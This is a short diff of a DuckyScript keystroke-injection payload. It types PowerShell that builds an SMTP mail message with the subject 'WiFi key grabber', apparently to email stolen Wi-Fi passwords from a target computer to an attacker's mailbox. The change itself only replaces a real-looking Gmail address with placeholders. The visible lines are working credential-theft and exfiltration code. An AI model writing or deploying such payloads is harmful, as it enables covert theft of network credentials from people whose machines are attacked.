@@ -17,9 +17,9 @@ STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOURMAIL
 DELAY 1000
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 DELAY 1000
-STRING $ReportEmail.From = 'pariosark@gmail.com'
+STRING $ReportEmail.From = 'FROMMAIL@gmail.com'
 DELAY 1000
-STRING $ReportEmail.To.Add('pariosark@gmail.com')
+STRING $ReportEmail.To.Add('YOURMAIL@gmail.com')
 DELAY 1000
 STRING $ReportEmail.Subject = 'WiFi key grabber'
 DELAY 1000
